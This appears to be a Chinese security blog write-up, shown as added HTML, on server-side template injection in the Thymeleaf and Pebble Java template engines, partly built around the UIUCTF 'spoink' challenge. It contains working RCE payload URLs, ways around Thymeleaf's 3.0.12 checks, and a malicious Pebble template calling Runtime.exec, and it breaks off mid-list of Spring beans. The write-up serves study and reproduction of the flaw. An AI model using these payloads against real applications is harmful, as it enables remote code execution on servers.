@@ -1,0 +1,534 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color" content="#3367D6"/>
+  <link rel="apple-touch-icon" href="/icons-192.png">
+  <link rel="manifest" href="/manifest.json">
+  
+  <meta name="generator" content="Hexo 6.2.0">
+
+  
+    <meta name="description" content="青山见我应如是">
+  
+
+  
+
+  
+    <meta name="author" content="CyanM0un">
+  
+
+  
+
+  
+
+  <title>SSTI Thymeleaf/Pebble | CyanM0un</title>
+
+  
+
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@1.1.3/index.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlightjs@9.16.2/styles/monokai.css">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+</head>
+<body>
+  <div class="root-container">
+    
+<!-- header container -->
+<header class="header-container post">
+  
+    <div class="post-image" style="background-image: url(/images/stp.jpeg)"></div>
+  
+
+  <!-- navbar -->
+<nav class="navbar">
+  <div class="navbar-content">
+    <!-- logo -->
+    <div class="navbar-logo">
+      <a href="/">
+        
+          CyanM0un
+        
+      </a>
+    </div>
+    <!-- link -->
+    <div class="navbar-link">
+      <div class="navbar-btn">
+        <div></div>
+        <div></div>
+        <div></div>
+      </div>
+      <ul class="navbar-list">
+        
+          <li class="navbar-list-item"><a href="/">首页</a></li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+    <div class="header-content">
+      <div class="post-text layout-block">
+        <div class="layout-margin">
+          <h1 class="title-wrap">SSTI Thymeleaf/Pebble</h1>
+          <h2 class="title-sub-wrap">
+            <strong>CyanM0un</strong>
+            <span>发布于</span>
+            <time  class="article-date" datetime="2022-07-30T09:14:07.000Z" itemprop="datePublished">2022-07-30</time>
+          </h2>
+          <ul class="wrap-list dark">
+  
+    <li><a href="/categories/%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/">📒 复现学习</a></li>
+  
+</ul>
+          <ul class="wrap-list dark">
+  
+</ul>
+        </div>
+      </div>
+    </div>
+  
+
+  
+  
+  
+</header>
+
+    <!-- 文章 -->
+
+<!-- 文章内容 -->
+<div class="body-container">
+  <article class="content-container layout-block post-container">
+    <div class="article-info">
+      
+      
+      
+      
+      <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>针对于 Java 的两种模板引擎，当你能控制返回的模板名，就能RCE？</p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="Thymeleaf"><a href="#Thymeleaf" class="headerlink" title="Thymeleaf"></a>Thymeleaf</h3><h4 id="片段表达式"><a href="#片段表达式" class="headerlink" title="片段表达式"></a>片段表达式</h4><p><code>~&#123;...&#125;</code>三种用法：</p>
+<ul>
+<li><p><code>~&#123;templatename&#125;</code>：引用整个模板</p>
+</li>
+<li><p><code>~&#123;::selector&#125;</code> 或 <code>~&#123;this::selector&#125;</code>：引用同一模板文件</p>
+</li>
+<li><p><code>~&#123;templatename::selector&#125;</code>：会在<code>/templates/</code>下寻找名为<code>templatename</code>的模板中定义的 fragment，可以在一个模板中引用另一个模板的片段，也可以只显示模板的某部分</p>
+</li>
+</ul>
+<p><img src="/SSTI-Thymeleaf-Pebble.assets/image-20220730174355957.png" alt="image-20220730174355957"></p>
+<p><img src="/SSTI-Thymeleaf-Pebble.assets/image-20220730174406028.png" alt="image-20220730174406028"></p>
+<p><img src="/SSTI-Thymeleaf-Pebble.assets/image-20220730174421948.png" alt="image-20220730174421948"></p>
+<p>还有一点需要注意，当出现<code>::</code>时，后面必须要有内容</p>
+<p><img src="/SSTI-Thymeleaf-Pebble.assets/image-20220731081222325.png" alt="image-20220731081222325"></p>
+<h4 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h4><p><code>ThymeleafView#renderFragment</code>会根据视图名解析模板名称</p>
+<p><img src="/SSTI-Thymeleaf-Pebble.assets/image-20220730174959945.png" alt="image-20220730174959945"></p>
+<p>当模板名包含<code>::</code>，会尝试解析表达式，用到的就是片段表达式</p>
+<p>官方手册中也有：</p>
+<p><img src="/SSTI-Thymeleaf-Pebble.assets/v2-bbff1766bf4f24428280cb72f3c0ec2c_r.jpg" alt="preview"></p>
+<p>继续跟进：</p>
+<p><img src="/SSTI-Thymeleaf-Pebble.assets/image-20220730175859549.png" alt="image-20220730175859549"></p>
+<p><img src="/SSTI-Thymeleaf-Pebble.assets/image-20220730175947451.png" alt="image-20220730175947451"></p>
+<p>进入<code>process</code>方法</p>
+<p><img src="/SSTI-Thymeleaf-Pebble.assets/image-20220730180147366.png" alt="image-20220730180147366"></p>
+<p>如果没有<code>_</code>则返回，如果有的话会将<code>__xx__</code>中间部分取出并尝试执行，所以可以推出payload的构造</p>
+<p><img src="/SSTI-Thymeleaf-Pebble.assets/image-20220730180721656.png" alt="image-20220730180721656"></p>
+<p>最终在<code>VariableExpression#executeVariableExpression</code>获得结果</p>
+<p><img src="/SSTI-Thymeleaf-Pebble.assets/image-20220731081014431.png" alt="image-20220731081014431"></p>
+<p><img src="/SSTI-Thymeleaf-Pebble.assets/image-20220731081053242.png" alt="image-20220731081053242"></p>
+<p>payload如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/admin?language=__$&#123;new%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22whoami%22).getInputStream()).next()&#125;__::xxx</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h4><p>3.0.12版本之后多了<code>SpringStandardExpressionUtils</code>类检测调用的表达式</p>
+<p><img src="/SSTI-Thymeleaf-Pebble.assets/image-20220731082608619.png" alt="image-20220731082608619"></p>
+<p><img src="/SSTI-Thymeleaf-Pebble.assets/image-20220731082928115.png" alt="image-20220731082928115"></p>
+<p>主要是：</p>
+<ul>
+<li>检测是否出现<code>new</code></li>
+<li><code>(</code>左边是否为<code>T</code></li>
+</ul>
+<h5 id="添加字符"><a href="#添加字符" class="headerlink" title="添加字符"></a>添加字符</h5><p>在<code>T</code>和<code>(</code>添加如%20，%0a，%09等</p>
+<p><img src="/SSTI-Thymeleaf-Pebble.assets/image-20220731083417794.png" alt="image-20220731083417794"></p>
+<p><img src="/SSTI-Thymeleaf-Pebble.assets/image-20220731083526975.png" alt="image-20220731083526975"></p>
+<h5 id="视图名和path一样"><a href="#视图名和path一样" class="headerlink" title="视图名和path一样"></a>视图名和path一样</h5><p>3.0.12后还多了<code>SpringStandardExpressionUtils</code></p>
+<blockquote>
+<p>如果视图名称包含在 URL 的路径或参数中，请避免将视图名称作为片段表达式执行</p>
+</blockquote>
+<p>如这样的代码</p>
+<p><img src="/SSTI-Thymeleaf-Pebble.assets/image-20220731084143097.png" alt="image-20220731084143097"></p>
+<p>先做检测：</p>
+<p><img src="/SSTI-Thymeleaf-Pebble.assets/image-20220731084326814.png" alt="image-20220731084326814"></p>
+<p><img src="/SSTI-Thymeleaf-Pebble.assets/image-20220731084446413.png" alt="image-20220731084446413"></p>
+<p>found为ture就会抛出异常</p>
+<p>这里vn的经过pack方法处理已经为小写了，getRequestURL转义下<code>+</code>和<code>&amp;</code></p>
+<p><strong>添加分号</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/home;/__$&#123;T (java.lang.Runtime).getRuntime().exec(%22calc%22)&#125;__::das</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>路径中存在 ；时，解析时会去掉</p>
+</blockquote>
+<p>这就导致了不一致</p>
+<p><img src="/SSTI-Thymeleaf-Pebble.assets/image-20220731085505601.png" alt="image-20220731085505601"></p>
+<p><img src="/SSTI-Thymeleaf-Pebble.assets/image-20220731085534359.png" alt="image-20220731085534359"></p>
+<p><strong>添加斜杠</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/home//__$&#123;T (java.lang.Runtime).getRuntime().exec(%22calc%22)&#125;__::das</span><br></pre></td></tr></table></figure>
+
+<p><img src="/SSTI-Thymeleaf-Pebble.assets/image-20220731085642351.png" alt="image-20220731085642351"></p>
+<p>但也因此执行的命令中不能含有<code>/</code>，是路由的问题（404）</p>
+<p><img src="/SSTI-Thymeleaf-Pebble.assets/image-20220731090050510.png" alt="image-20220731090050510"></p>
+<h3 id="Pebble"><a href="#Pebble" class="headerlink" title="Pebble"></a>Pebble</h3><p>题目来自UIUCTF spoink，题目其实就一个输入可控点，情景类似，用到的是pebble模板</p>
+<p><img src="/SSTI-Thymeleaf-Pebble.assets/image-20220731090439108.png" alt="image-20220731090439108"></p>
+<p>关于 pebble 的 ssti 找到的文章如这个</p>
+<p><a target="_blank" rel="noopener" href="https://gingsguard.github.io/server-side-template-injection-on-the-example-of-pebble/">https://gingsguard.github.io/server-side-template-injection-on-the-example-of-pebble/</a></p>
+<p>总体来说挖掘思路是借鉴上面的</p>
+<p>一开始在想有没有类似片段表达式的东西，去官方手册搜 block 相关的，好像并没有</p>
+<p><img src="/SSTI-Thymeleaf-Pebble.assets/image-20220731090552742.png" alt="image-20220731090552742"></p>
+<p>后来找解析模板名的类以及函数，也没什么思路，幸好y4师傅也做了这道题，自己思路确实太简单了还错了，跟着复现学到了很多</p>
+<h4 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h4><p><code>application.properties</code>当中并规定没有后缀</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pebble.prefix = templates</span><br><span class="line">pebble.suffix =</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>pebble当中有两个loader一个是classpathloader，另一个是fileloader，优先会在classpath下尝试加载模板文件，如果寻找不到则使用fileloader尝试加载模板文件</p>
+</blockquote>
+<p>在<code>com.mitchellbosecke.pebble.loader.FileLoader#getFile</code>加载模板文件内容</p>
+<p><img src="/SSTI-Thymeleaf-Pebble.assets/image-20220805084047345.png" alt="image-20220805084047345"></p>
+<p>因此目前的思路就是：</p>
+<ul>
+<li>上传带有恶意内容的模板</li>
+<li>利用LFI读取模板</li>
+</ul>
+<h4 id="模板上传"><a href="#模板上传" class="headerlink" title="模板上传"></a>模板上传</h4><p>路由中并没有文件上传的点，但是<code>Spring MVC</code>框架是围绕<code>DispatcherServlet</code>来设计的</p>
+<blockquote>
+<p>Servlet会把请求分发给各个处理器，并支持可配置的处理器映射、视图渲染、本地化、时区与主题渲染和<code>文件上传</code>等功能</p>
+</blockquote>
+<p>在分派时会检查这是否是一个表单请求</p>
+<p><img src="/SSTI-Thymeleaf-Pebble.assets/image-20220805091306825.png" alt="image-20220805091306825"></p>
+<blockquote>
+<p>处理表单的内容当中这会调用<code>org.apache.catalina.connector.Request#getParts</code></p>
+</blockquote>
+<p><img src="/SSTI-Thymeleaf-Pebble.assets/image-20220805091355626.png" alt="image-20220805091355626"></p>
+<blockquote>
+<p>会先将上传的文件保存到一个临时目录再最终复制到目标文件夹，在<code>org.apache.catalina.connector.Request#parseParts</code>获取临时文件夹</p>
+</blockquote>
+<p><img src="/SSTI-Thymeleaf-Pebble.assets/image-20220805091757853.png" alt="image-20220805091757853"></p>
+<p>为默认值空，所以会保存到 tmpdir 目录下（Linux就是在&#x2F;tmp下）（这个临时路径会根据配置当中<code>spring.servlet.multipart.location</code>的值设置，具体在org.springframework.boot.autoconfigure.web.servlet.MultipartProperties），另临时文件名又是根据 UID 随机生成的</p>
+<p><img src="/SSTI-Thymeleaf-Pebble.assets/image-20220805091632244.png" alt="image-20220805091632244"></p>
+<p>爆破是不太可能了，但还能利用文件描述符，docker搭起来换环境</p>
+<p>这里复现时一直没有临时文件，想远程 debug 一下 jar，好像有问题，先搁置一下…</p>
+<p>另外也记录一下 docker-compose 一些命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br><span class="line">docker</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="绕过模板RCE"><a href="#绕过模板RCE" class="headerlink" title="绕过模板RCE"></a>绕过模板RCE</h4><p>先拿个以前的恶意模板看看：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set cmd = &#x27;id&#x27; %&#125;</span><br><span class="line">&#123;% set bytes = (1).TYPE</span><br><span class="line">     .forName(&#x27;java.lang.Runtime&#x27;)</span><br><span class="line">     .methods[6]</span><br><span class="line">     .invoke(null,null)</span><br><span class="line">     .exec(cmd)</span><br><span class="line">     .inputStream</span><br><span class="line">     .readAllBytes() %&#125;</span><br><span class="line">&#123;&#123; (1).TYPE</span><br><span class="line">     .forName(&#x27;java.lang.String&#x27;)</span><br><span class="line">     .constructors[0]</span><br><span class="line">     .newInstance(([bytes]).toArray()) &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/SSTI-Thymeleaf-Pebble.assets/image-20220808083754429.png" alt="image-20220808083754429"></p>
+<p>被禁了，在<code>BlacklistMethodAccessValidator</code>类中</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] FORBIDDEN_METHODS = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;getClass&quot;</span>, <span class="string">&quot;wait&quot;</span>, <span class="string">&quot;notify&quot;</span>, <span class="string">&quot;notifyAll&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isMethodAccessAllowed</span><span class="params">(Object object, Method method)</span> &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">methodForbidden</span> <span class="operator">=</span> object <span class="keyword">instanceof</span> Class || object <span class="keyword">instanceof</span> Runtime || object <span class="keyword">instanceof</span> Thread || object <span class="keyword">instanceof</span> ThreadGroup || object <span class="keyword">instanceof</span> System || object <span class="keyword">instanceof</span> AccessibleObject || <span class="built_in">this</span>.isUnsafeMethod(method);</span><br><span class="line">        <span class="keyword">return</span> !methodForbidden;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>不能是这些类的实例，不能调用被禁止的方法</p>
+<blockquote>
+<p>Spring 应用程序的许多实例都隐式注册为bean</p>
+</blockquote>
+<p>因此思路是从bean当中找到一个保存了classloader的对象，通过获取到它我们就能通过执行loadClass加载到任意对象。</p>
+<blockquote>
+<p>pebble在初始化上下文时是在<code>com.mitchellbosecke.pebble.template.PebbleTemplateImpl#evaluate(java.io.Writer, java.util.Map&lt;java.lang.String,java.lang.Object&gt;, java.util.Locale)</code>当中</p>
+</blockquote>
+<p><img src="/SSTI-Thymeleaf-Pebble.assets/image-20220808084351593.png" alt="image-20220808084351593"></p>
+<p>这个beans是从下面加载的：应用程序的上下文</p>
+<p><img src="/SSTI-Thymeleaf-Pebble.assets/image-20220808084541863.png" alt="image-20220808084541863"></p>
+<p><img src="/SSTI-Thymeleaf-Pebble.assets/image-20220808084555824.png" alt="image-20220808084555824"></p>
+<p>通过以下代码查看都有什么</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">sss</span> <span class="operator">=</span> ((ServletRequestAttributes) RequestContextHolder.getRequestAttributes()).getRequest().getSession().getServletContext();</span><br><span class="line">org.springframework.web.context.<span class="type">WebApplicationContext</span> <span class="variable">context</span>  <span class="operator">=</span> org.springframework.web.context.support.WebApplicationContextUtils.getWebApplicationContext(sss);</span><br><span class="line">String[] beanDefinitionNames = context.getBeanDefinitionNames();</span><br><span class="line"><span class="keyword">for</span> (String o:beanDefinitionNames) &#123;</span><br><span class="line">    System.out.println(o.toString());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line">org.springframework.context.annotation.internalConfigurationAnnotationProcessor</span><br><span class="line">org.springframework.context.annotation.internalAutowiredAnnotationProcessor</span><br><span class="line">org.springframework.context.annotation.internalCommonAnnotationProcessor</span><br><span class="line">org.springframework.context.event.internalEventListenerProcessor</span><br><span class="line">org.springframework.context.event.internalEventListenerFactory</span><br><span class="line">spoinkApplication</span><br><span class="line">org.springframework.boot.autoconfigure.internalCachingMetadataReaderFactory</span><br><span class="line">homeController</span><br><span class="line">pebbleLoader</span><br><span class="line">org.springframework.boot.autoconfigure.AutoConfigurationPackages</span><br><span class="line">org.springframework.boot.autoconfigure.context.PropertyPlaceholderAutoConfiguration</span><br><span class="line">propertySourcesPlaceholderConfigurer</span><br><span class="line">org.springframework.boot.autoconfigure.websocket.servlet.WebSocketServletAutoConfiguration$TomcatWebSocketConfiguration</span><br><span class="line">websocketServletWebServerCustomizer</span><br><span class="line">org.springframework.boot.autoconfigure.websocket.servlet.WebSocketServletAutoConfiguration</span><br><span class="line">org.springframework.boot.autoconfigure.web.servlet.ServletWebServerFactoryConfiguration$EmbeddedTomcat</span><br><span class="line">tomcatServletWebServerFactory</span><br><span class="line">org.springframework.boot.autoconfigure.web.servlet.ServletWebServerFactoryAutoConfiguration</span><br><span class="line">servletWebServerFactoryCustomizer</span><br><span class="line">tomcatServletWebServerFactoryCustomizer</span><br><span class="line">org.springframework.boot.context.properties.ConfigurationPropertiesBindingPostProcessor</span><br><span class="line">org.springframework.boot.context.internalConfigurationPropertiesBinderFactory</span><br><span class="line">org.springframework.boot.context.internalConfigurationPropertiesBinder</span><br><span class="line">org.springframework.boot.context.properties.BoundConfigurationProperties</span><br><span class="line">org.springframework.boot.context.properties.EnableConfigurationPropertiesRegistrar.methodValidationExcludeFilter</span><br><span class="line">server-org.springframework.boot.autoconfigure.web.ServerProperties</span><br><span class="line">webServerFactoryCustomizerBeanPostProcessor</span><br><span class="line">errorPageRegistrarBeanPostProcessor</span><br><span class="line">org.springframework.boot.autoconfigure.web.servlet.DispatcherServletAutoConfiguration$DispatcherServletConfiguration</span><br><span class="line">dispatcherServlet</span><br><span class="line">spring.mvc-org.springframework.boot.autoconfigure.web.servlet.WebMvcProperties</span><br><span class="line">org.springframework.boot.autoconfigure.web.servlet.DispatcherServletAutoConfiguration$DispatcherServletRegistrationConfiguration</span><br><span class="line">dispatcherServletRegistration</span><br><span class="line">org.springframework.boot.autoconfigure.web.servlet.DispatcherServletAutoConfiguration</span><br><span class="line">org.springframework.boot.autoconfigure.task.TaskExecutionAutoConfiguration</span><br><span class="line">taskExecutorBuilder</span><br><span class="line">applicationTaskExecutor</span><br><span class="line">spring.task.execution-org.springframework.boot.autoconfigure.task.TaskExecutionProperties</span><br><span class="line">org.springframework.boot.autoconfigure.web.servlet.error.ErrorMvcAutoConfiguration$WhitelabelErrorViewConfiguration</span><br><span class="line">error</span><br><span class="line">beanNameViewResolver</span><br><span class="line">org.springframework.boot.autoconfigure.web.servlet.error.ErrorMvcAutoConfiguration$DefaultErrorViewResolverConfiguration</span><br><span class="line">conventionErrorViewResolver</span><br><span class="line">spring.web-org.springframework.boot.autoconfigure.web.WebProperties</span><br><span class="line">org.springframework.boot.autoconfigure.web.servlet.error.ErrorMvcAutoConfiguration</span><br><span class="line">errorAttributes</span><br><span class="line">basicErrorController</span><br><span class="line">errorPageCustomizer</span><br><span class="line">preserveErrorControllerTargetClassPostProcessor</span><br><span class="line">org.springframework.boot.autoconfigure.web.servlet.WebMvcAutoConfiguration$EnableWebMvcConfiguration</span><br><span class="line">requestMappingHandlerAdapter</span><br><span class="line">requestMappingHandlerMapping</span><br><span class="line">welcomePageHandlerMapping</span><br><span class="line">localeResolver</span><br><span class="line">themeResolver</span><br><span class="line">flashMapManager</span><br><span class="line">mvcConversionService</span><br><span class="line">mvcValidator</span><br><span class="line">mvcContentNegotiationManager</span><br><span class="line">mvcPatternParser</span><br><span class="line">mvcUrlPathHelper</span><br><span class="line">mvcPathMatcher</span><br><span class="line">viewControllerHandlerMapping</span><br><span class="line">beanNameHandlerMapping</span><br><span class="line">routerFunctionMapping</span><br><span class="line">resourceHandlerMapping</span><br><span class="line">mvcResourceUrlProvider</span><br><span class="line">defaultServletHandlerMapping</span><br><span class="line">handlerFunctionAdapter</span><br><span class="line">mvcUriComponentsContributor</span><br><span class="line">httpRequestHandlerAdapter</span><br><span class="line">simpleControllerHandlerAdapter</span><br><span class="line">handlerExceptionResolver</span><br><span class="line">mvcViewResolver</span><br><span class="line">mvcHandlerMappingIntrospector</span><br><span class="line">viewNameTranslator</span><br><span class="line">org.springframework.boot.autoconfigure.web.servlet.WebMvcAutoConfiguration$WebMvcAutoConfigurationAdapter</span><br><span class="line">defaultViewResolver</span><br><span class="line">viewResolver</span><br><span class="line">requestContextFilter</span><br><span class="line">org.springframework.boot.autoconfigure.web.servlet.WebMvcAutoConfiguration</span><br><span class="line">formContentFilter</span><br><span class="line">com.mitchellbosecke.pebble.boot.autoconfigure.PebbleServletWebConfiguration</span><br><span class="line">pebbleViewResolver</span><br><span class="line">com.mitchellbosecke.pebble.boot.autoconfigure.PebbleAutoConfiguration</span><br><span class="line">springExtension</span><br><span class="line">pebbleEngine</span><br><span class="line">pebble-com.mitchellbosecke.pebble.boot.autoconfigure.PebbleProperties</span><br><span class="line">org.springframework.boot.autoconfigure.jmx.JmxAutoConfiguration</span><br><span class="line">mbeanExporter</span><br><span class="line">objectNamingStrategy</span><br><span class="line">mbeanServer</span><br><span class="line">org.springframework.boot.autoconfigure.admin.SpringApplicationAdminJmxAutoConfiguration</span><br><span class="line">springApplicationAdminRegistrar</span><br><span class="line">org.springframework.boot.autoconfigure.aop.AopAutoConfiguration$ClassProxyingConfiguration</span><br><span class="line">forceAutoProxyCreatorToUseClassProxying</span><br><span class="line">org.springframework.boot.autoconfigure.aop.AopAutoConfiguration</span><br><span class="line">org.springframework.boot.autoconfigure.availability.ApplicationAvailabilityAutoConfiguration</span><br><span class="line">applicationAvailability</span><br><span class="line">org.springframework.boot.autoconfigure.jackson.JacksonAutoConfiguration$Jackson2ObjectMapperBuilderCustomizerConfiguration</span><br><span class="line">standardJacksonObjectMapperBuilderCustomizer</span><br><span class="line">spring.jackson-org.springframework.boot.autoconfigure.jackson.JacksonProperties</span><br><span class="line">org.springframework.boot.autoconfigure.jackson.JacksonAutoConfiguration$JacksonObjectMapperBuilderConfiguration</span><br><span class="line">jacksonObjectMapperBuilder</span><br><span class="line">org.springframework.boot.autoconfigure.jackson.JacksonAutoConfiguration$ParameterNamesModuleConfiguration</span><br><span class="line">parameterNamesModule</span><br><span class="line">org.springframework.boot.autoconfigure.jackson.JacksonAutoConfiguration$JacksonObjectMapperConfiguration</span><br><span class="line">jacksonObjectMapper</span><br><span class="line">org.springframework.boot.autoconfigure.jackson.JacksonAutoConfiguration</span><br><span class="line">jsonComponentModule</span><br><span class="line">org.springframework.boot.autoconfigure.context.ConfigurationPropertiesAutoConfiguration</span><br><span class="line">org.springframework.boot.autoconfigure.context.LifecycleAutoConfiguration</span><br><span class="line">lifecycleProcessor</span><br><span class="line">spring.lifecycle-org.springframework.boot.autoconfigure.context.LifecycleProperties</span><br><span class="line">org.springframework.boot.autoconfigure.http.HttpMessageConvertersAutoConfiguration$StringHttpMessageConverterConfiguration</span><br><span class="line">stringHttpMessageConverter</span><br><span class="line">org.springframework.boot.autoconfigure.http.JacksonHttpMessageConvertersConfiguration$MappingJackson2HttpMessageConverterConfiguration</span><br><span class="line">mappingJackson2HttpMessageConverter</span><br><span class="line">org.springframework.boot.autoconfigure.http.JacksonHttpMessageConvertersConfiguration</span><br><span class="line">org.springframework.boot.autoconfigure.http.HttpMessageConvertersAutoConfiguration</span><br><span class="line">messageConverters</span><br><span class="line">org.springframework.boot.autoconfigure.info.ProjectInfoAutoConfiguration</span><br><span class="line">spring.info-org.springframework.boot.autoconfigure.info.ProjectInfoProperties</span><br><span class="line">org.springframework.boot.autoconfigure.sql.init.SqlInitializationAutoConfiguration</span><br><span class="line">spring.sql.init-org.springframework.boot.autoconfigure.sql.init.SqlInitializationProperties</span><br><span class="line">org.springframework.boot.sql.init.dependency.DatabaseInitializationDependencyConfigurer$DependsOnDatabaseInitializationPostProcessor</span><br><span class="line">org.springframework.boot.autoconfigure.task.TaskSchedulingAutoConfiguration</span><br><span class="line">scheduledBeanLazyInitializationExcludeFilter</span><br><span class="line">taskSchedulerBuilder</span><br><span class="line">spring.task.scheduling-org.springframework.boot.autoconfigure.task.TaskSchedulingProperties</span><br><span class="line">org.springframework.boot.autoconfigure.web.client.RestTemplateAutoConfiguration</span><br><span class="line">restTemplateBuilderConfigurer</span><br><span class="line">restTemplateBuilder</span><br><span class="line">org.springframework.boot.autoconfigure.web.embedded.EmbeddedWebServerFactoryCustomizerAutoConfiguration$TomcatWebServerFactoryCustomizerConfiguration</span><br><span class="line">tomcatWebServerFactoryCustomizer</span><br><span class="line">org.springframework.boot.autoconfigure.web.embedded.EmbeddedWebServerFactoryCustomizerAutoConfiguration</span><br><span class="line">org.springframework.boot.autoconfigure.web.servlet.HttpEncodingAutoConfiguration</span><br><span class="line">characterEncodingFilter</span><br><span class="line">localeCharsetMappingsCustomizer</span><br><span class="line">org.springframework.boot.autoconfigure.web.servlet.MultipartAutoConfiguration</span><br><span class="line">multipartConfigElement</span><br><span class="line">multipartResolver</span><br><span 